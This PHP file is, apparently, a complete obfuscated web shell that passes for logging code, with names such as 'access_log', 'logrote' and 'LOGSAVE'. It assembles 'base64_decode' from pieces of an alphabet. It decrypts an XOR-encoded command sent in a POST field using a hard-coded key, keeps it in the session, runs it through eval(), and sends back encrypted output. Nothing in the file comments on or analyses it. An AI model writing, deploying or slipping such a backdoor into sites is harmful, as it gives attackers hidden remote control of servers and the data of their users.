<?php
session_start();
@set_time_limit(0);
@error_reporting(0);
$LOGNAME='access_log';
$SESS='ghco9xdnaco31gmafukxchph';
$md50_16='eccc97249feff381';

function modules($opt){
    $FINALLY='decode';
    @$a=$_POST['ALL']='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $ELLCTION=$a[1].$a[0];
    $ALLCTION='se';
    $ELLCTION=$ELLCTION.$ALLCTION;
    $num=8*8;
    $ALLCTION='_';
    $ALLs=$ELLCTION.'.'.($num).'.'.$ALLCTION.'.'.$FINALLY;
    $EXPLODE = explode('.',$ALLs);
    $RESULT = $EXPLODE[0].$EXPLODE[1] .$EXPLODE[2]. $EXPLODE[3];
    return $RESULT($opt);
}
if (isset($_POST[$LOGNAME])){

    function logrote($result,$k){
        $len = strlen($result);
        for($i=0;$i<$len;$i++) {
            $k2 = $i+1&15;
            $temp = $result[$i];
            $result[$i] = '';
            $result[$i] = $temp^$k[$k2];
        }
        return $result;
    }

    $FILES= modules(
                logrote(modules($_POST[$LOGNAME]),$md50_16)
            );

    if (isset($_SESSION[$SESS])){
        $Sess=$_SESSION[$SESS];
        $KONW=explode('|',$Sess);
        class LOGSAVE{public function nvoke($temp) {eval($temp."");}}
        $EXEXL=new LOGSAVE();
        $EXEXL->nvoke($KONW[0]);
        echo substr(md5($LOGNAME.$md50_16),0,16).base64_encode((logrote(@run($FILES),$md50_16))).substr(md5($LOGNAME.$md50_16),16);

    }else{
        $_SESSION[$SESS]=$FILES;
    }
}
?>